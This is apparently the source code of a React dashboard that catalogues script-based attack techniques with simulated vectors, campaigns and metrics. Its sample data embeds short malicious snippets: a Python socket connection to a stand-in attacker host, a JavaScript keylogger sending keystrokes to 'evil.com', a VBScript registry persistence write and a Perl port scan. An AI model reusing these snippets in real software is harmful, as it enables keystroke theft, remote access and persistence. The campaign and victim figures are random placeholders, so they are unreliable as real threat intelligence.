/**
 * Scripting Language Attacks Analysis
 * Comprehensive analysis of script-based attack vectors across multiple languages
 */

import React, { useState, useEffect, useMemo, useCallback } from 'react';
import {
  Box,
  Grid,
  Card,
  CardContent,
  Typography,
  Button,
  IconButton,
  Chip,
  Avatar,
  LinearProgress,
  Alert,
  Tooltip,
  useTheme,
  alpha,
  Paper,
  List,
  ListItem,
  ListItemText,
  ListItemIcon,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  TablePagination,
  TextField,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  CircularProgress,
  Tabs,
  Tab,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  Badge,
  Accordion,
  AccordionSummary,
  AccordionDetails,
} from '@mui/material';

import {
  Code,
  Security,
  Warning,
  Assessment,
  TrendingUp,
  Shield,
  BugReport,
  Visibility,
  Search,
  Refresh,
  OpenInNew,
  CheckCircle,  Error as ErrorIcon,
  Computer,
  Language,
  PlayArrow,
  ExpandMore,
  FileCopy,
  Build,
  Settings,
  Memory,
  Storage,
} from '@mui/icons-material';

// Interfaces
interface ScriptingVector {
  id: string;
  name: string;
  scripting_language: 'python' | 'javascript' | 'vbscript' | 'ruby' | 'perl' | 'lua' | 'php' | 'bash' | 'batch' | 'hta';
  platform_support: string[];
  attack_category: 'execution' | 'persistence' | 'privilege_escalation' | 'defense_evasion' | 'credential_access' | 'discovery' | 'lateral_movement' | 'collection' | 'command_control' | 'exfiltration';
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  execution_methods: string[];
  delivery_mechanisms: string[];
  obfuscation_techniques: string[];
  persistence_capabilities: string[];
  evasion_features: string[];
  payload_types: string[];
  target_environments: string[];
  detection_signatures: string[];
  mitigation_controls: string[];
  real_world_usage: string[];
  associated_malware: string[];
  complexity_rating: number;
  stealth_capability: number;
  impact_potential: number;
  ease_of_use: number;
  first_observed: Date;
  last_activity: Date;
  frequency_score: number;
}

interface ScriptSample {
  id: string;
  name: string;
  language: string;
  purpose: string;
  maliciousness: 'benign' | 'suspicious' | 'malicious' | 'highly_malicious';
  script_code: string;
  functionality: string[];
  encoded_variants: string[];
  iocs: string[];
  network_activity: string[];
  file_operations: string[];
  registry_operations: string[];
  process_operations: string[];
  anti_analysis: string[];
  attribution: string[];
  campaign_associations: string[];
}

interface ScriptingCampaign {
  id: string;
  campaign_name: string;
  threat_actor: string;
  start_date: Date;
  end_date?: Date;
  primary_languages: string[];
  target_industries: string[];
  attack_objectives: string[];
  victims_affected: number;
  success_metrics: number;
  detection_evasion_rate: number;
  geographic_scope: string[];
  attack_sophistication: 'low' | 'medium' | 'high' | 'advanced';
  techniques_employed: string[];
  infrastructure_used: string[];
}

interface ScriptingMetrics {
  total_vectors: number;
  active_campaigns: number;
  high_risk_scripts: number;
  detection_coverage: number;
  language_distribution: { [key: string]: number };
  platform_coverage: { [key: string]: number };
  attack_category_distribution: { [key: string]: number };
  avg_complexity: number;
  avg_stealth: number;
  avg_impact: number;
}

const ScriptingLanguageAttacks: React.FC = () => {
  const theme = useTheme();
  
  // State management
  const [vectors, setVectors] = useState<ScriptingVector[]>([]);
  const [samples, setSamples] = useState<ScriptSample[]>([]);
  const [campaigns, setCampaigns] = useState<ScriptingCampaign[]>([]);
  const [metrics, setMetrics] = useState<ScriptingMetrics | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  
  // Selection states
  const [selectedVector, setSelectedVector] = useState<ScriptingVector | null>(null);
  const [selectedSample, setSelectedSample] = useState<ScriptSample | null>(null);
  
  // UI states
  const [activeTab, setActiveTab] = useState(0);
  const [detailsOpen, setDetailsOpen] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterLanguage, setFilterLanguage] = useState<string>('all');
  const [filterCategory, setFilterCategory] = useState<string>('all');
  const [filterSeverity, setFilterSeverity] = useState<string>('all');
  const [page, setPage] = useState(0);
  const [rowsPerPage, setRowsPerPage] = useState(10);

  // Simulated data generation
  const generateScriptingData = useCallback(() => {
    const languages = ['python', 'javascript', 'vbscript', 'ruby', 'perl', 'lua', 'php', 'bash', 'batch', 'hta'] as const;
    const categories = ['execution', 'persistence', 'privilege_escalation', 'defense_evasion', 'credential_access', 'discovery', 'lateral_movement', 'collection', 'command_control', 'exfiltration'] as const;
    const severityLevels = ['low', 'medium', 'high', 'critical'] as const;
    const platforms = ['Windows', 'Linux', 'macOS', 'Android', 'iOS', 'Web Browsers'];

    // Generate scripting vectors
    const vectorData: ScriptingVector[] = [];
    for (let i = 0; i < 25; i++) {
      const language = languages[Math.floor(Math.random() * languages.length)];
      const category = categories[Math.floor(Math.random() * categories.length)];
      const severity = severityLevels[Math.floor(Math.random() * severityLevels.length)];
      
      vectorData.push({
        id: `vector-${i + 1}`,
        name: `${language.charAt(0).toUpperCase() + language.slice(1)} ${category.replace('_', ' ')} Vector ${i + 1}`,
        scripting_language: language,
        platform_support: platforms.slice(0, Math.floor(Math.random() * 4) + 1),
        attack_category: category,
        severity: severity as any,
        description: `Advanced ${language} scripting attack vector for ${category.replace('_', ' ')} operations with cross-platform capabilities`,
        execution_methods: [
          'Direct script execution',
          'Interpreter invocation',
          'Embedded in documents',
          'Web-based execution',
          'Container-based execution'
        ],
        delivery_mechanisms: [
          'Email attachments',
          'Malicious websites',
          'Social engineering',
          'USB devices',
          'Network shares',
          'Software vulnerabilities'
        ],
        obfuscation_techniques: [
          'Code minification',
          'String encoding',
          'Variable name obfuscation',
          'Control flow obfuscation',
          'Dead code insertion',
          'Encryption'
        ],
        persistence_capabilities: [
          'Registry modification',
          'Cron job creation',
          'Service installation',
          'Startup script modification',
          'Browser extension installation'
        ],
        evasion_features: [
          'Anti-debugging',
          'Virtual machine detection',
          'Sandbox evasion',
          'Time-based delays',
          'Environment checks'
        ],
        payload_types: [
          'Backdoors',
          'Keyloggers',
          'Data exfiltration tools',
          'Cryptocurrency miners',
          'Ransomware',
          'RATs'
        ],
        target_environments: [
          'Corporate networks',
          'Home users',
          'Cloud platforms',
          'Mobile devices',
          'IoT devices',
          'Web servers'
        ],
        detection_signatures: [
          'Script execution patterns',
          'Network communication anomalies',
          'File system modifications',
          'Process creation events',
          'Registry changes'
        ],
        mitigation_controls: [
          'Script execution policies',
          'Application whitelisting',
          'Network monitoring',
          'Endpoint protection',
          'User education',
          'Code signing validation'
        ],
        real_world_usage: [
          'Nation-state campaigns',
          'Cybercriminal operations',
          'Ransomware deployment',
          'Data theft',
          'Botnet creation'
        ],
        associated_malware: [
          'Emotet',
          'TrickBot',
          'Cobalt Strike',
          'Metasploit',
          'Empire',
          'Powersploit'
        ],
        complexity_rating: Math.floor(Math.random() * 10) + 1,
        stealth_capability: Math.floor(Math.random() * 10) + 1,
        impact_potential: Math.floor(Math.random() * 10) + 1,
        ease_of_use: Math.floor(Math.random() * 10) + 1,
        first_observed: new Date(Date.now() - Math.random() * 1000 * 24 * 60 * 60 * 1000),
        last_activity: new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000),
        frequency_score: Math.floor(Math.random() * 100) + 10
      });
    }

    // Generate script samples
    const sampleData: ScriptSample[] = [];
    const scriptExamples = [
      {
        name: 'Python Backdoor',
        language: 'python',
        purpose: 'Remote access and control',
        maliciousness: 'highly_malicious' as const,
        code: 'import socket, subprocess, os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("attacker.com",4444))'
      },
      {
        name: 'JavaScript Keylogger',
        language: 'javascript',
        purpose: 'Keystroke capture and exfiltration',
        maliciousness: 'malicious' as const,
        code: 'document.addEventListener("keydown", function(e) { fetch("http://evil.com/log?key=" + e.key); });'
      },
      {
        name: 'VBScript Persistence',
        language: 'vbscript',
        purpose: 'System persistence mechanism',
        maliciousness: 'malicious' as const,
        code: 'Set objShell = CreateObject("WScript.Shell")\nobjShell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateCheck", "malware.exe"'
      },
      {
        name: 'Ruby File Enumeration',
        language: 'ruby',
        purpose: 'System reconnaissance and file discovery',
        maliciousness: 'suspicious' as const,
        code: 'Dir.glob("**/*.{doc,docx,pdf,txt}").each { |file| puts file }'
      },
      {
        name: 'Perl Network Scanner',
        language: 'perl',
        purpose: 'Network discovery and port scanning',
        maliciousness: 'suspicious' as const,
        code: 'use IO::Socket::INET;\nfor $port (1..1024) { IO::Socket::INET->new(PeerAddr=>"target.com", PeerPort=>$port) }'
      }
    ];

    scriptExamples.forEach((example, index) => {
      sampleData.push({
        id: `sample-${index + 1}`,
        name: example.name,
        language: example.language,
        purpose: example.purpose,
        maliciousness: example.maliciousness,
        script_code: example.code,
        functionality: [
          'Network communication',
          'File system access',
          'Process manipulation',
          'Registry modification',
          'Data collection'
        ].slice(0, Math.floor(Math.random() * 4) + 1),
        encoded_variants: [
          'Base64 encoded',
          'Hex encoded',
          'URL encoded',
          'Custom encoding'
        ],
        iocs: [
          'Suspicious network connections',
          'Unusual file modifications',
          'Registry key changes',
          'Process creation events'
        ],
        network_activity: [
          'C2 communication',
          'Data exfiltration',
          'Download additional payloads',
          'Beacon traffic'
        ],
        file_operations: [
          'Create temporary files',
          'Modify system files',
          'Delete log files',
          'Encrypt user data'
        ],
        registry_operations: [
          'Create persistence keys',
          'Modify security settings',
          'Install services',
          'Change startup programs'
        ],
        process_operations: [
          'Inject into processes',
          'Create child processes',
          'Monitor running processes',
          'Terminate security software'
        ],
        anti_analysis: [
          'Virtual machine detection',
          'Debugger detection',
          'Sandbox evasion',
          'Time-based delays'
        ],
        attribution: [
          `APT-${Math.floor(Math.random() * 50) + 1}`,
          'Cybercriminal groups',
          'Script kiddies'
        ],
        campaign_associations: [
          'Operation ScriptStorm',
          'Multi-Language Campaign',
          'Cross-Platform Attack'
        ]
      });
    });

    // Generate scripting campaigns
    const campaignData: ScriptingCampaign[] = [];
    for (let i = 0; i < 12; i++) {
      const startDate = new Date(Date.now() - Math.random() * 730 * 24 * 60 * 60 * 1000);
      
      campaignData.push({
        id: `campaign-${i + 1}`,
        campaign_name: `Scripting Campaign ${i + 1}`,
        threat_actor: `APT-${Math.floor(Math.random() * 50) + 1}`,
        start_date: startDate,
        end_date: Math.random() > 0.4 ? new Date(startDate.getTime() + Math.random() * 365 * 24 * 60 * 60 * 1000) : undefined,
        primary_languages: languages.slice(0, Math.floor(Math.random() * 3) + 1),
        target_industries: [
          'Finance',
          'Healthcare',
          'Government',
          'Education',
          'Technology',
          'Manufacturing'
        ].slice(0, Math.floor(Math.random() * 3) + 1),
        attack_objectives: [
          'Data theft',
          'Financial fraud',
          'Espionage',
          'Ransomware',
          'Cryptomining'
        ].slice(0, Math.floor(Math.random() * 3) + 1),
        victims_affected: Math.floor(Math.random() * 50000) + 1000,
        success_metrics: Math.floor(Math.random() * 80) + 10,
        detection_evasion_rate: Math.floor(Math.random() * 70) + 20,
        geographic_scope: ['North America', 'Europe', 'Asia', 'Global'].slice(0, Math.floor(Math.random() * 3) + 1),
        attack_sophistication: ['low', 'medium', 'high', 'advanced'][Math.floor(Math.random() * 4)] as any,
        techniques_employed: categories.slice(0, Math.floor(Math.random() * 4) + 1),
        infrastructure_used: [
          'Compromised websites',
          'Bulletproof hosting',
          'Domain generation algorithms',
          'CDN services',
          'Cloud platforms'
        ].slice(0, Math.floor(Math.random() * 3) + 1)
      });
    }

    // Generate metrics
    const languageDist = languages.reduce((acc, language) => {
      acc[language] = vectorData.filter(v => v.scripting_language === language).length;
      return acc;
    }, {} as { [key: string]: number });

    const platformDist = platforms.reduce((acc, platform) => {
      acc[platform] = vectorData.filter(v => v.platform_support.includes(platform)).length;
      return acc;
    }, {} as { [key: string]: number });

    const categoryDist = categories.reduce((acc, category) => {
      acc[category] = vectorData.filter(v => v.attack_category === category).length;
      return acc;
    }, {} as { [key: string]: number });

    const metricsData: ScriptingMetrics = {
      total_vectors: vectorData.length,
      active_campaigns: campaignData.filter(c => !c.end_date).length,
      high_risk_scripts: vectorData.filter(v => v.severity === 'high' || v.severity === 'critical').length,
      detection_coverage: Math.floor(Math.random() * 25) + 60,
      language_distribution: languageDist,
      platform_coverage: platformDist,
      attack_category_distribution: categoryDist,
      avg_complexity: Math.floor(vectorData.reduce((sum, v) => sum + v.complexity_rating, 0) / vectorData.length),
      avg_stealth: Math.floor(vectorData.reduce((sum, v) => sum + v.stealth_capability, 0) / vectorData.length),
      avg_impact: Math.floor(vectorData.reduce((sum, v) => sum + v.impact_potential, 0) / vectorData.length)
    };

    setVectors(vectorData);
    setSamples(sampleData);
    setCampaigns(campaignData);
    setMetrics(metricsData);
    setLoading(false);
  }, []);

  useEffect(() => {
    generateScriptingData();
  }, [generateScriptingData]);

  // Filtered data
  const filteredVectors = useMemo(() => {
    return vectors.filter(vector => {
      const matchesSearch = vector.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                           vector.description.toLowerCase().includes(searchTerm.toLowerCase());
      const matchesLanguage = filterLanguage === 'all' || vector.scripting_language === filterLanguage;
      const matchesCategory = filterCategory === 'all' || vector.attack_category === filterCategory;
      const matchesSeverity = filterSeverity === 'all' || vector.severity === filterSeverity;
      
      return matchesSearch && matchesLanguage && matchesCategory && matchesSeverity;
    });
  }, [vectors, searchTerm, filterLanguage, filterCategory, filterSeverity]);

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return theme.palette.error.main;
      case 'high': return '#ff9800';
      case 'medium': return theme.palette.warning.main;
      case 'low': return theme.palette.success.main;
      default: return theme.palette.grey[500];
    }
  };

  const getLanguageIcon = (language: string) => {
    switch (language) {
      case 'python': return <Code />;
      case 'javascript': return <Language />;
      case 'vbscript': return <Build />;
      case 'ruby': return <Settings />;
      case 'perl': return <Memory />;
      case 'lua': return <PlayArrow />;
      case 'php': return <Storage />;
      case 'bash': return <Computer />;
      case 'batch': return <FileCopy />;
      case 'hta': return <Assessment />;
      default: return <Code />;
    }
  };

  const getMaliciousnessColor = (maliciousness: string) => {
    switch (maliciousness) {
      case 'highly_malicious': return theme.palette.error.main;
      case 'malicious': return '#ff9800';
      case 'suspicious': return theme.palette.warning.main;
      case 'benign': return theme.palette.success.main;
      default: return theme.palette.grey[500];
    }
  };

  // Render overview metrics
  const renderOverviewMetrics = () => (
    <Grid container spacing={3} sx={{ mb: 3 }}>
      {[
        { label: 'Total Vectors', value: metrics?.total_vectors || 0, icon: <Code />, color: theme.palette.primary.main },
        { label: 'High Risk Scripts', value: metrics?.high_risk_scripts || 0, icon: <Warning />, color: theme.palette.error.main },
        { label: 'Active Campaigns', value: metrics?.active_campaigns || 0, icon: <TrendingUp />, color: theme.palette.warning.main },
        { label: 'Detection Coverage', value: `${metrics?.detection_coverage || 0}%`, icon: <Shield />, color: theme.palette.success.main }
      ].map((metric, index) => (
        <Grid item xs={12} sm={6} lg={3} key={index}>
          <Card>
            <CardContent>
              <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                <Box>
                  <Typography variant="h4" fontWeight="bold">
                    {metric.value}
                  </Typography>
                  <Typography variant="body2" color="textSecondary">
                    {metric.label}
                  </Typography>
                </Box>
                <Avatar sx={{ bgcolor: alpha(metric.color, 0.1), color: metric.color }}>
                  {metric.icon}
                </Avatar>
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  // Render vectors table
  const renderVectorsTable = () => (
    <TableContainer component={Paper}>
      <Table>
        <TableHead>
          <TableRow>
            <TableCell>Vector Name</TableCell>
            <TableCell>Language</TableCell>
            <TableCell>Category</TableCell>
            <TableCell>Severity</TableCell>
            <TableCell>Platforms</TableCell>
            <TableCell>Complexity</TableCell>
            <TableCell>Stealth</TableCell>
            <TableCell>Actions</TableCell>
          </TableRow>
        </TableHead>
        <TableBody>
          {filteredVectors
            .slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
            .map((vector) => (
              <TableRow key={vector.id} hover>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    {getLanguageIcon(vector.scripting_language)}
                    <Typography variant="body2">{vector.name}</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <Chip size="small" label={vector.scripting_language} />
                </TableCell>
                <TableCell>
                  <Chip size="small" label={vector.attack_category.replace('_', ' ')} variant="outlined" />
                </TableCell>
                <TableCell>
                  <Chip
                    size="small"
                    label={vector.severity}
                    sx={{
                      bgcolor: alpha(getSeverityColor(vector.severity), 0.1),
                      color: getSeverityColor(vector.severity)
                    }}
                  />
                </TableCell>
                <TableCell>
                  <Tooltip title={vector.platform_support.join(', ')}>
                    <Chip size="small" label={`${vector.platform_support.length} platforms`} />
                  </Tooltip>
                </TableCell>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <LinearProgress
                      variant="determinate"
                      value={vector.complexity_rating * 10}
                      sx={{ flexGrow: 1, height: 6, borderRadius: 3 }}
                      color={vector.complexity_rating > 7 ? 'error' : vector.complexity_rating > 4 ? 'warning' : 'success'}
                    />
                    <Typography variant="caption">{vector.complexity_rating}/10</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <LinearProgress
                      variant="determinate"
                      value={vector.stealth_capability * 10}
                      sx={{ flexGrow: 1, height: 6, borderRadius: 3 }}
                      color={vector.stealth_capability > 7 ? 'error' : vector.stealth_capability > 4 ? 'warning' : 'success'}
                    />
                    <Typography variant="caption">{vector.stealth_capability}/10</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <IconButton
                    size="small"
                    onClick={() => {
                      setSelectedVector(vector);
                      setDetailsOpen(true);
                    }}
                  >
                    <Visibility />
                  </IconButton>
                </TableCell>
              </TableRow>
            ))}
        </TableBody>
      </Table>
      <TablePagination
        component="div"
        count={filteredVectors.length}
        page={page}
        onPageChange={(_, newPage) => setPage(newPage)}
        rowsPerPage={rowsPerPage}
        onRowsPerPageChange={(event) => {
          setRowsPerPage(parseInt(event.target.value, 10));
          setPage(0);
        }}
      />
    </TableContainer>
  );

  // Render script samples
  const renderSamples = () => (
    <Grid container spacing={3}>
      {samples.map((sample) => (
        <Grid item xs={12} md={6} key={sample.id}>
          <Card 
            sx={{ 
              cursor: 'pointer',
              transition: 'all 0.3s ease',
              '&:hover': {
                transform: 'translateY(-2px)',
                boxShadow: theme.shadows[4],
              }
            }}
            onClick={() => {
              setSelectedSample(sample);
              setDetailsOpen(true);
            }}
          >
            <CardContent>
              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'start', mb: 2 }}>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                  {getLanguageIcon(sample.language)}
                  <Typography variant="h6">
                    {sample.name}
                  </Typography>
                </Box>
                <Chip
                  size="small"
                  label={sample.maliciousness.replace('_', ' ')}
                  sx={{
                    bgcolor: alpha(getMaliciousnessColor(sample.maliciousness), 0.1),
                    color: getMaliciousnessColor(sample.maliciousness)
                  }}
                />
              </Box>
              <Typography variant="body2" color="textSecondary" gutterBottom>
                {sample.purpose}
              </Typography>
              <Box sx={{ mb: 2, bgcolor: theme.palette.grey[100], p: 1, borderRadius: 1, maxHeight: 120, overflow: 'hidden' }}>
                <Typography variant="caption" fontFamily="monospace" sx={{ wordBreak: 'break-all' }}>
                  {sample.script_code}
                </Typography>
              </Box>
              <Box sx={{ mb: 2 }}>
                <Typography variant="caption" display="block">
                  Language: {sample.language}
                </Typography>
                <Typography variant="caption" display="block">
                  Functionality: {sample.functionality.slice(0, 2).join(', ')}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                {sample.attribution.slice(0, 2).map((attr) => (
                  <Chip key={attr} size="small" label={attr} variant="outlined" />
                ))}
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  // Render campaigns
  const renderCampaigns = () => (
    <Grid container spacing={3}>
      {campaigns.map((campaign) => (
        <Grid item xs={12} md={6} lg={4} key={campaign.id}>
          <Card>
            <CardContent>
              <Typography variant="h6" gutterBottom>
                {campaign.campaign_name}
              </Typography>
              <Typography variant="body2" color="textSecondary" gutterBottom>
                Actor: {campaign.threat_actor}
              </Typography>
              <Box sx={{ mb: 2 }}>
                <Typography variant="caption" display="block">
                  Victims: {campaign.victims_affected.toLocaleString()}
                </Typography>
                <Typography variant="caption" display="block">
                  Success Rate: {campaign.success_metrics}%
                </Typography>
                <Typography variant="caption" display="block">
                  Evasion Rate: {campaign.detection_evasion_rate}%
                </Typography>
                <Typography variant="caption" display="block">
                  Sophistication: {campaign.attack_sophistication}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mb: 1 }}>
                {campaign.primary_languages.slice(0, 3).map((lang) => (
                  <Chip key={lang} size="small" label={lang} />
                ))}
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                {campaign.attack_objectives.slice(0, 2).map((objective) => (
                  <Chip key={objective} size="small" label={objective} variant="outlined" />
                ))}
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  if (loading) {
    return (
      <Box sx={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: 400 }}>
        <CircularProgress />
      </Box>
    );
  }

  if (error) {
    return (
      <Alert severity="error" sx={{ m: 2 }}>
        {error}
      </Alert>
    );
  }

  return (
    <Box sx={{ p: 3 }}>
      <Box sx={{ mb: 3 }}>
        <Typography variant="h4" gutterBottom>
          Scripting Language Attacks
        </Typography>
        <Typography variant="body1" color="textSecondary">
          Comprehensive analysis of script-based attack vectors across multiple programming languages and platforms
        </Typography>
      </Box>

      {renderOverviewMetrics()}

      <Card sx={{ mb: 3 }}>
        <CardContent>
          <Box sx={{ display: 'flex', gap: 2, mb: 3, flexWrap: 'wrap' }}>
            <TextField
              size="small"
              placeholder="Search vectors..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              InputProps={{
                startAdornment: <Search />
              }}
              sx={{ minWidth: 200 }}
            />
            <FormControl size="small" sx={{ minWidth: 150 }}>
              <InputLabel>Language</InputLabel>
              <Select
                value={filterLanguage}
                onChange={(e) => setFilterLanguage(e.target.value)}
                label="Language"
              >
                <MenuItem value="all">All Languages</MenuItem>
                <MenuItem value="python">Python</MenuItem>
                <MenuItem value="javascript">JavaScript</MenuItem>
                <MenuItem value="vbscript">VBScript</MenuItem>
                <MenuItem value="ruby">Ruby</MenuItem>
                <MenuItem value="perl">Perl</MenuItem>
                <MenuItem value="lua">Lua</MenuItem>
                <MenuItem value="php">PHP</MenuItem>
                <MenuItem value="bash">Bash</MenuItem>
                <MenuItem value="batch">Batch</MenuItem>
                <MenuItem value="hta">HTA</MenuItem>
              </Select>
            </FormControl>
            <FormControl size="small" sx={{ minWidth: 150 }}>
              <InputLabel>Category</InputLabel>
              <Select
                value={filterCategory}
                onChange={(e) => setFilterCategory(e.target.value)}
                label="Category"
              >
                <MenuItem value="all">All Categories</MenuItem>
                <MenuItem value="execution">Execution</MenuItem>
                <MenuItem value="persistence">Persistence</MenuItem>
                <MenuItem value="privilege_escalation">Privilege Escalation</MenuItem>
                <MenuItem value="defense_evasion">Defense Evasion</MenuItem>
                <MenuItem value="credential_access">Credential Access</MenuItem>
                <MenuItem value="discovery">Discovery</MenuItem>
                <MenuItem value="lateral_movement">Lateral Movement</MenuItem>
                <MenuItem value="collection">Collection</MenuItem>
                <MenuItem value="command_control">Command & Control</MenuItem>
                <MenuItem value="exfiltration">Exfiltration</MenuItem>
              </Select>
            </FormControl>
            <FormControl size="small" sx={{ minWidth: 120 }}>
              <InputLabel>Severity</InputLabel>
              <Select
                value={filterSeverity}
                onChange={(e) => setFilterSeverity(e.target.value)}
                label="Severity"
              >
                <MenuItem value="all">All Severities</MenuItem>
                <MenuItem value="critical">Critical</MenuItem>
                <MenuItem value="high">High</MenuItem>
                <MenuItem value="medium">Medium</MenuItem>
                <MenuItem value="low">Low</MenuItem>
              </Select>
            </FormControl>
            <Button startIcon={<Refresh />} onClick={generateScriptingData}>
              Refresh
            </Button>
          </Box>

          <Tabs value={activeTab} onChange={(_, newValue) => setActiveTab(newValue)} sx={{ mb: 3 }}>
            <Tab label="Attack Vectors" />
            <Tab label="Script Samples" />
            <Tab label="Campaign Analysis" />
          </Tabs>

          {activeTab === 0 && renderVectorsTable()}
          {activeTab === 1 && renderSamples()}
          {activeTab === 2 && renderCampaigns()}
        </CardContent>
      </Card>

      {/* Details Dialog */}
      <Dialog
        open={detailsOpen}
        onClose={() => setDetailsOpen(false)}
        maxWidth="lg"
        fullWidth
      >
        <DialogTitle>
          {selectedVector?.name || selectedSample?.name}
        </DialogTitle>
        <DialogContent>
          {selectedVector && (
            <Grid container spacing={3}>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Vector Details
                  </Typography>
                  <Typography variant="body2" paragraph>
                    {selectedVector.description}
                  </Typography>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="caption" display="block">
                      Language: {selectedVector.scripting_language}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Category: {selectedVector.attack_category}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Platforms: {selectedVector.platform_support.join(', ')}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Complexity: {selectedVector.complexity_rating}/10
                    </Typography>
                  </Box>
                </Paper>
              </Grid>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Mitigation Controls
                  </Typography>
                  <List dense>
                    {selectedVector.mitigation_controls.slice(0, 6).map((control, index) => (
                      <ListItem key={index}>
                        <ListItemIcon>
                          <Shield />
                        </ListItemIcon>
                        <ListItemText primary={control} />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
            </Grid>
          )}
          {selectedSample && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Script Analysis
                  </Typography>
                  <Typography variant="body2" paragraph>
                    Purpose: {selectedSample.purpose}
                  </Typography>
                  <Typography variant="h6" gutterBottom sx={{ mt: 2 }}>
                    Script Code
                  </Typography>
                  <Box sx={{ bgcolor: theme.palette.grey[100], p: 2, borderRadius: 1, mb: 2 }}>
                    <Typography variant="body2" fontFamily="monospace">
                      {selectedSample.script_code}
                    </Typography>
                  </Box>
                  <Typography variant="h6" gutterBottom>
                    Functionality
                  </Typography>
                  <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mb: 2 }}>
                    {selectedSample.functionality.map((func) => (
                      <Chip key={func} size="small" label={func} />
                    ))}
                  </Box>
                  <Typography variant="h6" gutterBottom>
                    Attribution
                  </Typography>
                  <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                    {selectedSample.attribution.map((attr) => (
                      <Chip key={attr} size="small" label={attr} variant="outlined" />
                    ))}
                  </Box>
                </Paper>
              </Grid>
            </Grid>
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setDetailsOpen(false)}>
            Close
          </Button>
          <Button
            variant="outlined"
            startIcon={<OpenInNew />}
            onClick={() => window.open('https://attack.mitre.org/techniques/T1059/', '_blank')}
          >
            MITRE T1059
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
};

export default ScriptingLanguageAttacks;